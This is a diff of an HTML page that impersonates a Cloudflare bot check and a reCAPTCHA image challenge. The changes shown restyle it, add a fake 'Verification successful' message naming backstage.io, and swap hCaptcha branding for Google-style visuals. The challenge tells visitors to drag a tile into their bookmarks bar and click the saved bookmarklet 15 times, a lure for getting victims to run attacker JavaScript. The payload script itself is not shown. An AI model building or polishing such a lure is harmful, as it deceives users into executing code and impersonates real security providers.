@@ -9,31 +9,40 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      background-color: #0a0a0a;
-      color: #ffffff;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: #ffffff;
+      color: #212529;
+      font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif;
+      font-size: 16px;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
     .container {
       width: 100%;
-      max-width: 860px;
+      max-width: 1060px;
       padding: 0 40px;
       flex: 1;
       display: flex;
       flex-direction: column;
       justify-content: center;
+      box-sizing: border-box;
+      margin-bottom: 150px;
+    }
+
+    .body-popup-open .container {
+      display: none;
     }
 
     .header {
       display: flex;
       align-items: center;
       gap: 14px;
-      margin-bottom: 32px;
+      margin-bottom: 24px;
     }
 
     .robot-emoji {
@@ -43,42 +52,65 @@
 
     .site-name {
       font-size: 40px;
-      font-weight: 600;
-      color: #ffffff;
-      letter-spacing: -0.5px;
+      font-weight: 700;
+      color: #212529;
+      letter-spacing: -0.02em;
+      line-height: 1.1;
     }
 
     .title {
-      font-size: 18px;
+      font-size: 20px;
       font-weight: 700;
-      color: #ffffff;
-      margin-bottom: 14px;
+      color: #212529;
+      margin-bottom: 10px;
+      letter-spacing: -0.01em;
+      line-height: 1.3;
+      width: 100%;
+      max-width: 100%;
     }
 
     .description {
-      font-size: 14px;
-      color: #aaaaaa;
-      line-height: 1.7;
-      max-width: 760px;
-      margin-bottom: 36px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #212529;
+      line-height: 1.65;
+      max-width: 100%;
+      width: 100%;
+      margin-bottom: 24px;
+      letter-spacing: 0.01em;
     }
 
     .captcha-box {
-      width: 300px;
-      border: 1px solid #555;
-      border-radius: 4px;
-      background: #1a1a1a;
+      width: 340px;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      background: #ffffff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
       display: flex;
+      flex-direction: row;
       align-items: center;
       justify-content: space-between;
-      padding: 18px 20px;
+      padding: 16px 12px;
       cursor: pointer;
-      transition: border-color 0.2s;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
 
     .captcha-box:hover {
-      border-color: #888;
+      border-color: #c0c0c0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
     }
+
+    /* Left column: checkbox+text OR spinner/success - one visible at a time */
+    .captcha-widget-default {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-width: 0;
+      overflow: hidden;
+    }
+
+    .captcha-box.verify-active .captcha-left { display: none !important; }
+    .captcha-box.verify-active .verify-status { display: flex !important; }
 
     .captcha-left {
       display: flex;
@@ -98,9 +130,9 @@
     .checkbox {
       width: 22px;
       height: 22px;
-      border: 2px solid #aaa;
-      border-radius: 3px;
-      background: transparent;
+      border: 2px solid #888;
+      border-radius: 4px;
+      background: #fff;
       flex-shrink: 0;
       position: relative;
       transition: border-color 0.2s, background 0.2s;
@@ -124,45 +156,60 @@
     }
 
     .verify-text {
-      font-size: 14px;
-      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+      color: #212529;
+      letter-spacing: 0.01em;
     }
 
     .cloudflare-brand {
       display: flex;
       flex-direction: column;
       align-items: flex-end;
-      gap: 2px;
+      gap: 4px;
     }
 
     .cloudflare-logo {
       display: flex;
       align-items: center;
-      gap: 5px;
+      gap: 6px;
+    }
+
+    .cf-logo-img {
+      height: 30px;
+      width: auto;
+      max-width: 100px;
+      object-fit: contain;
+      display: block;
     }
 
     .cf-cloud {
-      width: 30px;
-      height: 18px;
+      width: 28px;
+      height: 16px;
     }
 
     .cf-text {
-      font-size: 11px;
+      font-size: 10px;
       font-weight: 700;
-      color: #ffffff;
-      letter-spacing: 0.5px;
+      color: #212529;
+      letter-spacing: 0.1em;
       text-transform: uppercase;
     }
 
     .cf-links {
       display: flex;
-      gap: 6px;
-      font-size: 10px;
+      align-items: center;
+      gap: 1px;
+      font-size: 11px;
+      font-weight: 500;
     }
 
     .cf-links a {
-      color: #f6821f;
       text-decoration: none;
+    }
+
+    .cf-link2 {
+      color: #040405;
     }
 
     .cf-links a:hover {
@@ -171,28 +218,42 @@
 
     .footer {
       width: 100%;
-      border-top: 1px solid #2a2a2a;
-      padding: 16px 40px;
+      border-top: 1px solid #e0e0e0;
+      padding: 24px 40px 32px;
       display: flex;
-      justify-content: center;
-      gap: 20px;
+      flex-direction: column;
       align-items: center;
-      font-size: 12px;
-      color: #888;
+      justify-content: center;
+      gap: 12px;
+      font-size: 13px;
+      font-weight: 600;
+      background: #ffffff;
+      color: #6c757d;
+      letter-spacing: 0.01em;
+      text-align: center;
+    }
+
+    .footer .footer-line-1 {
+      color: #6c757d;
+    }
+
+    .footer .footer-line-2 {
+      color: #6c757d;
     }
 
     .footer a {
-      color: #4a9eff;
-      text-decoration: none;
+      color: #0d6efd;
+      text-decoration: underline;
     }
 
     .footer a:hover {
       text-decoration: underline;
+      opacity: 0.85;
     }
 
-    .ray-id { color: #888; }
+    .ray-id { color: #6c757d; font-weight: 600; }
 
-    /* ── hCaptcha-style challenge popup ── */
+    /* ── reCAPTCHA-style challenge popup ── */
     .captcha-popup-overlay {
       position: fixed;
       inset: 0;
@@ -201,7 +262,8 @@
       align-items: center;
       justify-content: center;
       z-index: 1000;
-      padding: 24px;
+      padding: 16px;
+      overflow-y: auto;
     }
     .captcha-popup-overlay.hidden { display: none !important; }
 
@@ -209,185 +271,269 @@
       background: #fff;
       border-radius: 6px;
       width: 100%;
-      max-width: 460px;
-      overflow: hidden;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.35);
+      max-width: 410px;
+      max-height: calc(100vh - 40px);
+      overflow-y: auto;
+      overflow-x: hidden;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.45);
+      border: 1px solid #e0e0e0;
+      font-family: Roboto, Arial, sans-serif;
+      margin: auto;
     }
 
     .captcha-box-inner { padding: 0; }
-
-    /* Stage visibility */
     .challenge-stage { display: block; }
     .challenge-stage.hidden { display: none !important; }
 
-    /* Teal header – tall, big left-aligned text */
+    /* Blue header – reCAPTCHA exact */
     .challenge-banner {
-      background: #0d8a82;
+      background: #4285f4;
+      color: rgba(255,255,255,0.88);
+      padding: 20px 22px 18px;
+      font-size: 15px;
+      font-weight: 400;
+      line-height: 1.4;
+    }
+    .challenge-banner strong {
+      display: block;
+      font-size: 26px;
+      font-weight: 700;
       color: #fff;
-      padding: 22px 24px 28px;
-      font-size: 20px;
-      font-weight: 500;
-      text-align: left;
-      line-height: 1.3;
-      min-height: 90px;
-      display: flex;
-      align-items: flex-start;
+      margin-top: 6px;
+      line-height: 1.1;
     }
 
-    /* Image grid area */
-    .challenge-grid-wrap {
-      background: #ebebeb;
-      padding: 10px;
-    }
-
+    /* 3×3 photo grid – tiny white gaps like reCAPTCHA */
     .challenge-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 4px;
-      background: #ebebeb;
+      gap: 3px;
+      background: #fff;
     }
 
     .challenge-tile {
-      aspect-ratio: 1;
-      background: #f0f0f0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 48px;
-      user-select: none;
-      cursor: default;
       position: relative;
-      transition: outline 0.15s;
+      aspect-ratio: 1;
+      overflow: hidden;
+      cursor: pointer;
+      user-select: none;
+      background: #ddd;
     }
 
-    .challenge-tile:hover { background: #e8e8e8; }
-
-    .challenge-tile.draggable {
-      cursor: grab;
-      outline: 4px solid #0d8a82;
-      outline-offset: -4px;
-      background: #fff;
-    }
-    .challenge-tile.draggable:active { cursor: grabbing; }
-
-    .challenge-tile a {
-      text-decoration: none;
-      color: inherit;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    .challenge-tile img {
       width: 100%;
       height: 100%;
-      font-size: inherit;
+      object-fit: cover;
+      display: block;
+      transition: filter 0.15s;
+      pointer-events: none;
     }
 
-    /* Stage 2: click counter */
+    /* Hover */
+    .challenge-tile:hover img { filter: brightness(0.85); }
+
+    /* Selected: blue tint + checkmark */
+    .challenge-tile.selected img { filter: brightness(0.65) saturate(0.6); }
+    .challenge-tile.selected::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: rgba(66,133,244,0.4);
+      pointer-events: none;
+    }
+
+    .tile-check {
+      display: none;
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      width: 28px;
+      height: 28px;
+      background: #4285f4;
+      border-radius: 50%;
+      align-items: center;
+      justify-content: center;
+      z-index: 3;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.4);
+    }
+    .tile-check svg { display: block; }
+    .challenge-tile.selected .tile-check { display: flex; }
+
+    /* Draggable tile overlay */
+    .challenge-tile.draggable { cursor: grab; outline: 3px solid #4285f4; outline-offset: -3px; }
+    .challenge-tile.draggable:active { cursor: grabbing; }
+    .challenge-tile .drag-layer {
+      position: absolute;
+      inset: 0;
+      z-index: 2;
+      text-decoration: none;
+      cursor: grab;
+    }
+
+    .banner-hint {
+      display: block;
+      font-size: 11px;
+      font-weight: 400;
+      color: rgba(255,255,255,0.72);
+      margin-top: 6px;
+      letter-spacing: 0.01em;
+    }
+
+    /* Stage 2 */
     .challenge-stage2-body {
-      background: #ebebeb;
-      padding: 48px 24px;
+      background: #f9f9f9;
+      padding: 40px 24px 36px;
       text-align: center;
-      min-height: 240px;
+      min-height: 230px;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 12px;
+      gap: 10px;
     }
-    .click-counter-line {
-      font-size: 16px;
-      color: #333;
-    }
+    .click-counter-line { font-size: 14px; color: #555; margin: 0; }
     .click-counter-line strong {
       display: block;
-      font-size: 56px;
+      font-size: 68px;
       font-weight: 700;
-      color: #0d8a82;
+      color: #4285f4;
       line-height: 1;
       margin-bottom: 6px;
     }
-    .click-counter-sub {
-      font-size: 13px;
-      color: #666;
-    }
+    .click-counter-sub { font-size: 12px; color: #888; max-width: 260px; }
 
-    /* hCaptcha-style footer bar */
-    .hcap-footer {
+    /* Footer – reCAPTCHA */
+    .rc-footer {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 10px 14px;
+      padding: 12px 16px;
+      background: #f9f9f9;
       border-top: 1px solid #e0e0e0;
-      background: #fff;
     }
-    .hcap-footer-left {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-    .hcap-footer-lang {
-      font-size: 12px;
-      font-weight: 600;
-      color: #444;
-    }
-    .hcap-footer-dots {
-      display: flex;
-      gap: 5px;
-    }
-    .hcap-dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: #333;
-    }
-    .hcap-dot.inactive {
-      background: #ccc;
-    }
-    .hcap-footer-actions {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .hcap-icon-btn {
+    .rc-footer-icons { display: flex; align-items: center; gap: 16px; }
+    .rc-icon-btn {
       background: none;
       border: none;
       cursor: pointer;
       padding: 4px;
-      color: #555;
-      font-size: 16px;
-      line-height: 1;
+      color: #888;
       display: flex;
       align-items: center;
+      transition: color 0.15s;
     }
-    .hcap-logo {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, #29c3c1, #1a73e8);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-    }
-    .hcap-skip-btn {
-      background: #fff;
-      border: 1px solid #ccc;
+    .rc-icon-btn:hover { color: #333; }
+    .rc-verify-btn {
+      background: #4285f4;
+      color: #fff;
+      border: none;
       border-radius: 4px;
-      padding: 8px 20px;
+      padding: 10px 26px;
       font-size: 14px;
       font-weight: 600;
-      color: #333;
+      letter-spacing: 0.05em;
       cursor: pointer;
       transition: background 0.15s;
     }
-    .hcap-skip-btn:hover { background: #f5f5f5; }
-    .hcap-skip-btn.done-btn {
-      background: #0d8a82;
-      color: #fff;
-      border-color: #0d8a82;
-    }
-    .hcap-skip-btn.done-btn:hover { background: #0b7570; }
+    .rc-verify-btn:hover { background: #3367d6; }
 
     .hidden { display: none !important; }
+
+    /* Verify flow: left column only - Cloudflare stays on right */
+    .verify-status {
+      display: none;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 12px;
+      box-sizing: border-box;
+      min-width: 0;
+      overflow: hidden;
+    }
+    .verify-status:not(.hidden) { display: flex; }
+    .verify-status.hidden { display: none !important; }
+    .captcha-box.verify-active .verify-status { display: flex !important; }
+    .captcha-box.verify-active .captcha-left { display: none !important; }
+    .verify-spinner {
+      width: 22px;
+      height: 22px;
+      position: relative;
+      flex-shrink: 0;
+      animation: verify-spinner-rotate 0.8s linear infinite;
+    }
+    .verify-spinner-dot {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      border-radius: 50%;
+      background: #0d6efd;
+      top: 50%;
+      left: 50%;
+      margin-top: -2px;
+      margin-left: -2px;
+    }
+    .verify-spinner-dot:nth-child(1) { transform: translateY(-9px); }
+    .verify-spinner-dot:nth-child(2) { transform: translateX(9px); }
+    .verify-spinner-dot:nth-child(3) { transform: translateY(9px); }
+    .verify-spinner-dot:nth-child(4) { transform: translateX(-9px); }
+    @keyframes verify-spinner-rotate {
+      to { transform: rotate(360deg); }
+    }
+    .verify-status-text {
+      color: #212529;
+      font-size: 16px;
+      font-weight: 500;
+      letter-spacing: 0.01em;
+    }
+    .verify-status-text.hidden { display: none !important; }
+    .verify-success {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #212529;
+      font-size: 16px;
+      font-weight: 600;
+      letter-spacing: 0.01em;
+      min-width: 0;
+      flex: 1;
+    }
+    .verify-success.hidden { display: none !important; }
+    .verify-success-icon {
+      width: 22px;
+      height: 22px;
+      background: #22c55e;
+      color: #fff;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .verify-success-cf-logo {
+      height: 18px;
+      max-height: 18px;
+      width: auto;
+      max-width: 80px;
+      object-fit: contain;
+      object-position: left center;
+      margin-left: 6px;
+      flex-shrink: 1;
+      display: block;
+    }
+
+    .verify-success-msg {
+      font-size: 18px;
+      font-weight: 700;
+      color: #212529;
+      margin-bottom: 36px;
+      line-height: 1.5;
+      max-width: 100%;
+    }
+    .verify-success-msg.hidden { display: none !important; }
+
+    .captcha-widget-wrap.hidden { display: none !important; }
   </style>
 </head>
 <body>
@@ -403,94 +549,113 @@
       This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.
     </p>
 
-    <!-- The widget -->
+    <p class="verify-success-msg hidden" id="verify-success-msg">
+      <strong>Verification successful. Waiting for <span id="verify-success-host">backstage.io</span> to respond.</strong>
+    </p>
+
+    <div class="captcha-widget-wrap" id="captcha-widget-wrap">
     <div class="captcha-box" id="captcha-widget" role="button" tabindex="0" aria-label="Verify you are human">
-      <div class="captcha-left">
-        <input type="checkbox" id="robotCheckbox" class="real-checkbox">
-        <div class="checkbox" id="visibleCheckbox"></div>
-        <span class="verify-text">Verify you are human</span>
+      <div class="captcha-widget-default" id="captcha-widget-default">
+        <div class="captcha-left">
+          <input type="checkbox" id="robotCheckbox" class="real-checkbox">
+          <div class="checkbox" id="visibleCheckbox"></div>
+          <span class="verify-text">Verify you are human</span>
+        </div>
+        <div class="verify-status hidden" id="verify-status">
+          <div class="verify-spinner" id="verify-spinner">
+            <span class="verify-spinner-dot"></span>
+            <span class="verify-spinner-dot"></span>
+            <span class="verify-spinner-dot"></span>
+            <span class="verify-spinner-dot"></span>
+          </div>
+          <span class="verify-status-text" id="verify-status-text">Verifying...</span>
+          <div class="verify-success hidden" id="verify-success">
+            <span class="verify-success-icon">✓</span>
+            <span class="verify-success-text">Success!</span>
+          </div>
+        </div>
       </div>
       <div class="cloudflare-brand">
         <div class="cloudflare-logo">
-          <svg class="cf-cloud" viewBox="0 0 109 44" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M73.2 32.4c.3-1 .2-2-.4-2.8-.5-.7-1.4-1.2-2.3-1.3l-35.5-.5c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6.2-.3.5-.5.9-.5l35.8-.5c4.2-.2 8.8-3.6 10.4-7.7l2-5.3c.1-.2.1-.4 0-.6C81.2 5.8 73.7 0 65 0 57.8 0 51.6 4 48.4 9.9c-1.7-1.3-3.9-2-6.2-1.8-4.2.4-7.5 3.8-7.8 8-.1.8 0 1.5.1 2.3C28.4 18.7 24 23.4 24 29c0 .4 0 .8.1 1.2.1.2.3.4.5.4l48 .7h.1c.4 0 .7-.2.9-.5l.1-.4z" fill="#F6821F"/>
-            <path d="M84.4 18.3c-.4 0-.7 0-1.1.1-.2 0-.4.2-.5.4l-1.5 5.3c-.3 1-.2 2 .4 2.8.5.7 1.4 1.2 2.3 1.3l7.5.5c.2 0 .4.1.5.3.1.2.1.4 0 .6-.2.3-.5.5-.9.5l-7.7.5c-4.3.2-8.8 3.6-10.4 7.7H106c.2 0 .5-.2.5-.4.4-1.6.6-3.3.6-5C107.1 25.3 96.5 18.3 84.4 18.3z" fill="#FBAD41"/>
-          </svg>
-          <span class="cf-text">CLOUDFLARE</span>
+          <img src="assets/Cloudflare-logo.png" alt="Cloudflare" class="cf-logo-img">
         </div>
         <div class="cf-links">
-          <a href="#" onclick="return false;">Privacy</a>
-          <span>•</span>
-          <a href="#" onclick="return false;">Help</a>
+          <a class="cf-link" href="#" onclick="return false;">Privacy</a>
+          <span class="cf-link-separator">•</span>
+          <a class="cf-link2" href="#" onclick="return false;">Help</a>
         </div>
       </div>
     </div>
   </div>
-
-  <div class="footer">
-    <span class="ray-id">Ray ID: <span id="cf-ray-id"></span></span>
-    <span>|</span>
-    <span>Performance and Security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a></span>
-    <span>|</span>
-    <a href="#" onclick="return false;">Privacy</a>
   </div>
 
-  <!-- hCaptcha-style challenge popup -->
+  <div class="footer">
+    <div class="footer-line-1">
+      <span class="ray-id">Ray ID: <span id="cf-ray-id"></span></span>
+    </div>
+    <div class="footer-line-2">
+      Performance and Security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a> | <a href="#" onclick="return false;">Privacy</a>
+    </div>
+  </div>
+
+  <!-- reCAPTCHA-style challenge popup -->
   <div class="captcha-popup-overlay hidden" id="challenge-popup-overlay">
     <div class="challenge-popup">
       <div class="captcha-box-inner hidden" id="captcha-box">
 
-        <!-- Challenge 1/2: drag to bookmark -->
+        <!-- Challenge 1/2: drag correct image to bookmarks -->
         <div class="challenge-stage" id="challenge1">
-          <div class="challenge-banner" id="challenge1Banner">Drag the item you can't eat to your bookmarks bar</div>
-          <div class="challenge-grid-wrap">
-            <div class="challenge-grid" id="challenge1Grid"></div>
+          <div class="challenge-banner" id="challenge1Banner">
+              Select all images with
+              <strong id="challenge1Subject">stairs</strong>
+              <span class="banner-hint">Drag the outlined tile to your bookmarks bar</span>
           </div>
-          <div class="hcap-footer">
-            <div class="hcap-footer-left">
-              <span class="hcap-footer-lang">EN</span>
-              <div class="hcap-footer-dots">
-                <span class="hcap-dot"></span>
-                <span class="hcap-dot inactive"></span>
-              </div>
+          <div class="challenge-grid" id="challenge1Grid"></div>
+          <div class="rc-footer">
+            <div class="rc-footer-icons">
+              <button class="rc-icon-btn" title="Refresh" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+              </button>
+              <button class="rc-icon-btn" title="Audio challenge" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
+              </button>
+              <button class="rc-icon-btn" title="Help" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+              </button>
             </div>
-            <div class="hcap-footer-actions">
-              <button class="hcap-icon-btn" title="More options" onclick="return false;">⋮</button>
-              <button class="hcap-icon-btn" title="Refresh" onclick="return false;">↻</button>
-              <div class="hcap-logo">🤖</div>
-              <button type="button" class="hcap-skip-btn done-btn" id="done1Button">Next</button>
-            </div>
+            <button type="button" class="rc-verify-btn" id="done1Button">NEXT</button>
           </div>
         </div>
 
-        <!-- Challenge 2/2: click 15 times -->
+        <!-- Challenge 2/2: click bookmarklet 15 times -->
         <div class="challenge-stage hidden" id="challenge2">
-          <div class="challenge-banner">Click the bookmarked answer 15 times to verify</div>
+          <div class="challenge-banner">
+            Click the saved bookmark
+            <strong>15 times to verify</strong>
+          </div>
           <div class="challenge-stage2-body">
             <p class="click-counter-line">
               <strong id="clickCounter">0</strong>
               <span>/ 15 clicks</span>
             </p>
-            <p class="click-counter-sub">Use the bookmarklet you just saved in your bookmarks bar</p>
+            <p class="click-counter-sub">Click the bookmarklet you just saved in your bookmarks bar</p>
           </div>
-          <div class="hcap-footer">
-            <div class="hcap-footer-left">
-              <span class="hcap-footer-lang">EN</span>
-              <div class="hcap-footer-dots">
-                <span class="hcap-dot"></span>
-                <span class="hcap-dot"></span>
-              </div>
+          <div class="rc-footer">
+            <div class="rc-footer-icons">
+              <button class="rc-icon-btn" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+              </button>
+              <button class="rc-icon-btn" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
+              </button>
+              <button class="rc-icon-btn" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+              </button>
             </div>
-            <div class="hcap-footer-actions">
-              <button class="hcap-icon-btn" title="More options" onclick="return false;">⋮</button>
-              <button class="hcap-icon-btn" title="Refresh" onclick="return false;">↻</button>
-              <div class="hcap-logo">🤖</div>
-              <button type="button" class="hcap-skip-btn done-btn" id="done2Button">Submit</button>
-            </div>
+            <button type="button" class="rc-verify-btn" id="done2Button">VERIFY</button>
           </div>
         </div>
 
-        <!-- Legacy hidden elements (used by script.js) -->
         <div class="hidden" id="calculationDisplay"><p id="currentCalc"></p><p id="clickCount"></p></div>
         <div class="hidden" id="captcha-container"></div>
         <div class="hidden" id="timer"><span id="timer-value">20</span></div>
